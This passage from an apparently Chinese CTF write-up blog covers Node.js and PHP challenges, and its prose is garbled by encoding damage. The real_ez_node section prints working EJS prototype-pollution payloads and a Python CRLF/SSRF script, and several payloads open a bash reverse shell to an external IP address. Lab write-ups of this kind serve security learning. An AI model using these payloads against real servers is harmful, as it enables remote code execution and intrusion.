class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_COOKIE</span> = process.<span class="property">env</span>.<span class="property">SECRET_COOKIE</span> || <span class="string">&quot;this_is_testing_cookie&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag1 = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag1&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> flag2 = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">LoginController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">        <span class="keyword">const</span> password = req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line">        <span class="keyword">if</span> (username !== <span class="string">&quot;admin&quot;</span> || password !== <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>()) &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Login Failed&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="variable constant_">SECRET_COOKIE</span>)</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&quot;/flag1&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">CheckInternalController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(<span class="string">&quot;check.html&quot;</span>,&#123;<span class="attr">root</span>:<span class="string">&quot;static&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">CheckController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> checkcode = req.<span class="property">body</span>.<span class="property">checkcode</span>?req.<span class="property">body</span>.<span class="property">checkcode</span>:<span class="number">1234</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span>(checkcode.<span class="property">length</span> === <span class="number">16</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            checkcode = checkcode.<span class="title function_">toLowerCase</span>()</span><br><span class="line">            <span class="keyword">if</span>(checkcode !== <span class="string">&quot;aGr5AtSp55dRacer&quot;</span>)&#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode1:&quot;</span> + checkcode&#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;You Got Another Part Of Flag: &quot;</span> + flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>()&#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode2:&quot;</span> + checkcode&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Flag1Controller</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="variable constant_">SECRET_COOKIE</span>)&#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>,flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag2&quot;</span>,flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Login success. Welcome,admin!&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>, flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;You Got One Part Of Flag! Try To Get Another Part of Flag!&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Unauthorized&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="title class_">LoginController</span>,</span><br><span class="line">    <span class="title class_">CheckInternalController</span>,</span><br><span class="line">    <span class="title class_">Flag1Controller</span>,</span><br><span class="line">    <span class="title class_">CheckController</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•ï¼Œå…ˆçœ‹flag1ï¼ŒåŠ ä¸€ä¸ªcookieå°±è¡Œ</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211091858315.png" alt="image-20241211091858315" style="zoom:80%;" /><p>é‡ç‚¹æ˜¯flag2ï¼Œéœ€è¦ç»•è¿‡toLowerCase()ï¼Œä¼ å…¥ä¸€ä¸ªjsonå€¼ï¼Œè¦æ±‚è½¬å°å†™åä¸ºaGr5AtSp55dRacerï¼Œå¯ä»¥é€šè¿‡jsonå½¢å¼ä¼ å…¥æ•°ç»„æ¥ç»•è¿‡ï¼Œè€è€å®å®ä¼ å…¥å­—ç¬¦ä¸²æ˜¯ä¸å¯èƒ½çš„ã€‚</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211092027384.png" alt="image-20241211092027384"></p><p>ç®€å•ã€‚</p><h2 id="è¥¿æ¹–è®ºå‰‘-2022-real-ez-node"><a href="#è¥¿æ¹–è®ºå‰‘-2022-real-ez-node" class="headerlink" title="[è¥¿æ¹–è®ºå‰‘ 2022]real_ez_node"></a>[è¥¿æ¹–è®ºå‰‘ 2022]real_ez_node</h2><p>å…³é”®æºç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> safeobj = <span class="built_in">require</span>(<span class="string">&#x27;safe-obj&#x27;</span>);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">q</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;get q&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/copy&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-type&#x27;</span>,<span class="string">&#x27;text/html;charset=utf-8&#x27;</span>)</span><br><span class="line">  <span class="keyword">var</span> ip = req.<span class="property">connection</span>.<span class="property">remoteAddress</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(ip);</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;</span><br><span class="line">      <span class="attr">msg</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!ip.<span class="title function_">includes</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">      obj.<span class="property">msg</span>=<span class="string">&quot;only for admin&quot;</span></span><br><span class="line">      res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">      <span class="keyword">return</span> </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> req.<span class="property">body</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(!index.<span class="title function_">includes</span>(<span class="string">&quot;__proto__&quot;</span>))&#123;</span><br><span class="line">          safeobj.<span class="title function_">expand</span>(user, index, req.<span class="property">body</span>[index])</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/curl&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:3000/?q=&#x27;</span> + q</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.<span class="title function_">get</span>(url,<span class="function">(<span class="params">res1</span>)=&gt;</span>&#123;</span><br><span class="line">                    <span class="keyword">const</span> &#123; statusCode &#125; = res1;</span><br><span class="line">                    <span class="keyword">const</span> contentType = res1.<span class="property">headers</span>[<span class="string">&#x27;content-type&#x27;</span>];</span><br><span class="line">                  </span><br><span class="line">                    <span class="keyword">let</span> error;</span><br><span class="line">                    <span class="comment">// ä»»ä½• 2xx çŠ¶æ€ç éƒ½è¡¨ç¤ºæˆåŠŸå“åº”ï¼Œä½†è¿™é‡Œåªæ£€æŸ¥ 200ã€‚</span></span><br><span class="line">                    <span class="keyword">if</span> (statusCode !== <span class="number">200</span>) &#123;</span><br><span class="line">                      error = <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Request Failed.\n&#x27;</span> +</span><br><span class="line">                                        <span class="string">`Status Code: <span class="subst">$&#123;statusCode&#125;</span>`</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                      <span class="variable language_">console</span>.<span class="title function_">error</span>(error.<span class="property">message</span>);</span><br><span class="line">                      <span class="comment">// æ¶ˆè´¹å“åº”æ•°æ®ä»¥é‡Šæ”¾å†…å­˜</span></span><br><span class="line">                      res1.<span class="title function_">resume</span>();</span><br><span class="line">                      <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  </span><br><span class="line">                    res1.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">                    <span class="keyword">let</span> rawData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123; rawData += chunk;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">&#x27;request success&#x27;</span>) &#125;);</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                      <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">const</span> parsedData = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(rawData);</span><br><span class="line">                        res.<span class="title function_">end</span>(parsedData+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                        res.<span class="title function_">end</span>(e.<span class="property">message</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                  &#125;).<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">`Got error: <span class="subst">$&#123;e.message&#125;</span>`</span>);</span><br><span class="line">                  &#125;)</span><br><span class="line">                res.<span class="title function_">end</span>(<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                res.<span class="title function_">end</span>(error+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„ç»™å‡ºäº†å„ç§ç‰ˆæœ¬ï¼Œå‘ç°å­˜åœ¨ejsæ¨¡æ¿å¼•æ“çš„JavaScriptåŸå‹é“¾æ±¡æŸ“ã€‚</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211150618302.png" alt="image-20241211150618302" style="zoom:67%;" /><p>æˆ‘ä»¬å‘ç°&#x2F;copyè·¯ç”±ä¸‹ä¼šå¯¹<code>var ip = req.connection.remoteAddress;</code>ipå€¼è¿›è¡Œåˆ¤æ–­ï¼Œéœ€è¦ä¸º127.0.0.1ï¼Œè¿™ä¸æ˜¯é€šè¿‡XFFç­‰å°±èƒ½æ”¹å˜çš„ï¼Œæˆ‘ä»¬ç»§ç»­å¾€ä¸‹å®¡ä»£ç ã€‚å‘ç°&#x2F;curlè·¯ç”±å¤„å­˜åœ¨ssrfï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å°±èƒ½é€šè¿‡å¯¹&#x2F;curlè·¯ç”±çš„æ“ä½œï¼Œè®©ä»–ä»¥è‡ªå·±çš„èº«ä»½å»&#x2F;copyè·¯ç”±ä»è€Œè§¦å‘jsåŸå‹é“¾æ±¡æŸ“å‘¢ï¼Ÿï¼</p><p>&#x2F;curlè·¯ç”±ä¸‹å­˜åœ¨<code>http.get</code>æ–¹æ³•ï¼Œå¯ä»¥é€ æˆCRLF Injection</p><p>é‚£ä¹ˆï¼Œæˆ‘ä»¬åªéœ€è¦æ„é€ æ±¡æŸ“è¯·æ±‚åŒ…ï¼Œé€šè¿‡ejsæ¨¡æ¿å¼•æ“æ±¡æŸ“æ¥å®ç°RCEï¼ï¼</p><p>å®Œç¾äº†ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor.prototype&quot;:&#123;&quot;constructor.prototype&quot;:&#123;&quot;outputFunctionName&quot;:&quot;__tmp1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;); __tmp2&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211194627392.png" alt="image-20241211194627392"></p><p>å…³é”®ä»£ç å¦‚ä¸Šï¼Œè¿‡æ»¤äº†<code>__proto__</code>åŒæ—¶è¯´æ˜äº†æ±¡æŸ“çš„å­˜åœ¨ã€‚</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211194704771.png" alt="image-20241211194704771" style="zoom:80%;" /><p>åŒæ—¶ï¼Œè¿™é‡Œå‘ç°å¦‚æœé”®åé‡Œé¢å­˜åœ¨ <code>.</code> æ‰ä¼šç»§ç»­è°ƒç”¨ <code>_safe.expand</code>ï¼Œç›¸å½“äºé€’å½’mergeçš„æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;__tmp1; global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1\&quot;&#x27;); __tmp2&quot;&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ„é€ CRLF</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /copy HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:3000</span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string">Content-Length: 190</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;/bin/bash -c \\&quot;/bin/bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1\\&quot;&#x27;);var __tmp2&quot;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = payload.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\u0120&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\u010d\u010a&#x27;</span>).replace(<span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;\u017b&#x27;</span>).replace(</span><br><span class="line">    <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;\u017d&#x27;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\u0122&#x27;</span>).replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\u0127&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\u013e&#x27;</span>).replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\u015c&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = urllib.parse.quote(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">url = <span class="string">&quot;http://node4.anna.nssctf.cn:28958/curl?q=&quot;</span></span><br><span class="line">requests.get(url+payload)</span><br></pre></td></tr></table></figure><p>å½“æ—¶åœ¨æ±¡æŸ“payloadå¤„å¡äº†å¾ˆä¹…ï¼ï¼ä¸çŸ¥é“ä¸ºå•¥å°±æ˜¯å¼¹ä¸äº†shellï¼Œè¿™ä¸ªå¯ä»¥å¼¹ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;/bin/bash -c \\&quot;/bin/bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1\\&quot;&#x27;);var __tmp2&quot;&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦æ€è·¯å°±æ˜¯åœ¨curlè·¯ç”±ä¸‹é€šè¿‡CRLFæ”»å‡»æ¥æ„é€ æ¶æ„æ•°æ®åŒ…æ¥å®ç°SSRFï¼Œç”¨127.0.0.1å»è®¿é—®&#x2F;copyè·¯ç”±ï¼Œé€ æˆejsæ¨¡æ¿å¼•æ“çš„æ±¡æŸ“ä»è€Œå®ç°RCEï¼</p><h2 id="UUCTF-2022-æ–°ç”Ÿèµ›-ezpop"><a href="#UUCTF-2022-æ–°ç”Ÿèµ›-ezpop" class="headerlink" title="[UUCTF 2022 æ–°ç”Ÿèµ›]ezpop"></a>[UUCTF 2022 æ–°ç”Ÿèµ›]ezpop</h2><p>è™½ç„¶æ˜¯æ–°ç”Ÿèµ›ï¼Œä½†è¿˜å¯ä»¥ã€‚æœ‰ç‚¹å°ç»¼åˆã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key===<span class="string">&quot;UUCTF&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ob=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;basedata));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">rce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;t;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pdata</span>=<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span 